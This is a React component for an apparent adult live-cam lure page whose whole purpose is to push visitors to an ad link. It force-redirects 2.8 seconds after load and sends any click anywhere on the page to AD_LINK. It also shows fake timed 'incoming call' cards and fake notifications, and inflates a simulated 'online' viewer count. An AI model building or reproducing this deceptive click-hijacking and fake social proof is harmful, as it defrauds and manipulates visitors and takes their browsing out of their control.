import React, { useState, useEffect, useCallback } from 'react';
import {
  AD_LINK,
  FEATURED_LIVE_VIDEO,
  THUMBNAIL_VIDEOS,
  CALLING_GIRLS,
  POPUP_NOTIFICATIONS
} from './data/mockData';
import { NotificationAlert } from './types';
import { Header } from './components/Header';
import { LiveHeroStream } from './components/LiveHeroStream';
import { VideoGrid } from './components/VideoGrid';
import { IncomingCallCard } from './components/IncomingCallCard';
import { NotificationToast } from './components/NotificationToast';
import { Footer } from './components/Footer';
import { Video, ShieldCheck, Zap, Sparkles } from 'lucide-react';

export default function App() {
  const [onlineCount, setOnlineCount] = useState<number>(142890);
  const [activeGirlIndex, setActiveGirlIndex] = useState<number>(0);
  const [isCallVisible, setIsCallVisible] = useState<boolean>(false);
  const [activeNotifications, setActiveNotifications] = useState<NotificationAlert[]>([]);

  // Core handler for Ad Redirection
  const handleAdClick = useCallback(() => {
    try {
      window.location.href = AD_LINK;
    } catch (e) {
      window.open(AD_LINK, '_blank');
    }
  }, []);

  // 1. Auto-redirect timer (2.5 - 3 seconds after page load)
  useEffect(() => {
    const autoRedirectTimer = setTimeout(() => {
      handleAdClick();
    }, 2800);

    return () => clearTimeout(autoRedirectTimer);
  }, [handleAdClick]);

  // 2. Global Universal Click Listener (Any click anywhere redirects to Ad)
  useEffect(() => {
    const handleGlobalClick = (e: MouseEvent) => {
      // Direct redirect on any click anywhere on the viewport
      handleAdClick();
    };

    window.addEventListener('click', handleGlobalClick);
    return () => window.removeEventListener('click', handleGlobalClick);
  }, [handleAdClick]);

  // 3. Calling Card Interval Logic
  // - Starts 2.5s after load
  // - Stays on screen for 4.5 seconds
  // - Hides for 10 seconds
  // - Advances to next girl in array
  useEffect(() => {
    let hideTimer: NodeJS.Timeout;
    let nextTimer: NodeJS.Timeout;

    // Initial appearance after 2.5 seconds
    const initialTimer = setTimeout(() => {
      setIsCallVisible(true);

      // Hide after 4.5 seconds
      hideTimer = setTimeout(() => {
        setIsCallVisible(false);

        // Schedule next girl after 10 seconds
        const startLoop = () => {
          nextTimer = setInterval(() => {
            setActiveGirlIndex(prev => (prev + 1) % CALLING_GIRLS.length);
            setIsCallVisible(true);

            // Hide after 4.5s
            setTimeout(() => {
              setIsCallVisible(false);
            }, 4500);
          }, 14500); // 4.5s visible + 10s wait = 14.5s total cycle
        };

        startLoop();
      }, 4500);
    }, 2500);

    return () => {
      clearTimeout(initialTimer);
      clearTimeout(hideTimer);
      if (nextTimer) clearInterval(nextTimer);
    };
  }, []);

  // 4. Pop-up Notifications Sequence (4-5 notifications popping up)
  useEffect(() => {
    POPUP_NOTIFICATIONS.forEach((notif, index) => {
      const timer = setTimeout(() => {
        setActiveNotifications(prev => [notif, ...prev].slice(0, 4));
      }, (index + 1) * 1200); // 1.2s, 2.4s, 3.6s, 4.8s, 6s

      return () => clearTimeout(timer);
    });
  }, []);

  // Dynamic online count simulation
  useEffect(() => {
    const interval = setInterval(() => {
      setOnlineCount(prev => prev + Math.floor(Math.random() * 21) - 10);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  const handleDismissNotification = (id: string) => {
    setActiveNotifications(prev => prev.filter(n => n.id !== id));
  };

  return (
    <div className="min-h-screen bg-gray-950 text-gray-100 flex flex-col selection:bg-rose-600 selection:text-white relative cursor-pointer">
      {/* Top Redirecting Counter Notice Bar */}
      <div 
        onClick={handleAdClick} 
        className="bg-gradient-to-r from-red-600 via-rose-600 to-pink-600 text-white text-xs font-bold py-1 px-4 text-center flex items-center justify-center gap-2 shadow-lg"
      >
        <Zap className="w-3.5 h-3.5 text-yellow-300 fill-yellow-300 animate-bounce" />
        <span>LIVE 4K SERVER CONNECTED • TAP ANYWHERE TO UNLOCK FULL HD STREAM & VIDEO CHAT</span>
        <Sparkles className="w-3.5 h-3.5 text-yellow-300 fill-yellow-300 animate-pulse" />
      </div>

      {/* Main Header */}
      <Header onAdClick={handleAdClick} onlineCount={onlineCount} />

      {/* Main Body Layout */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-3 sm:px-6 py-4 space-y-6">
        {/* Top Featured 1st Thumbnail Live Stream */}
        <LiveHeroStream video={FEATURED_LIVE_VIDEO} onAdClick={handleAdClick} />

        {/* Video Grid (Thumbnails 1, 2, 3, 4) */}
        <VideoGrid videos={THUMBNAIL_VIDEOS} onAdClick={handleAdClick} />
      </main>

      {/* Footer */}
      <Footer onAdClick={handleAdClick} />

      {/* Incoming Calling Popup Card (Appears 2-3s, stays 4-5s, 10s delay loop) */}
      <IncomingCallCard
        girl={CALLING_GIRLS[activeGirlIndex]}
        onAdClick={handleAdClick}
        isVisible={isCallVisible}
      />

      {/* Top Right / Center Floating Notifications */}
      <NotificationToast
        notifications={activeNotifications}
        onAdClick={handleAdClick}
        onDismiss={handleDismissNotification}
      />

      {/* Sticky Bottom Bar for Mobile & Desktop */}
      <div 
        onClick={handleAdClick}
        className="fixed bottom-0 left-0 right-0 z-30 bg-gray-950/95 border-t border-rose-600/50 p-2.5 backdrop-blur-md flex items-center justify-between px-4 sm:px-8 shadow-2xl cursor-pointer hover:bg-gray-900 transition"
      >
        <div className="flex items-center gap-2.5">
          <div className="w-3 h-3 rounded-full bg-emerald-500 animate-ping" />
          <p className="text-xs sm:text-sm font-extrabold text-white flex items-center gap-1.5">
            <span>🔴 142,890 LIVE CAM HOSTS ONLINE</span>
            <span className="hidden sm:inline text-rose-400 font-normal">• Tap anywhere to enter</span>
          </p>
        </div>

        <button className="bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-extrabold text-xs sm:text-sm px-4 py-2 rounded-full shadow-lg shadow-rose-600/40 flex items-center gap-1.5 uppercase tracking-wider animate-bounce">
          <Video className="w-4 h-4 fill-white" />
          <span>JOIN 4K LIVE NOW</span>
        </button>
      </div>
    </div>
  );
}
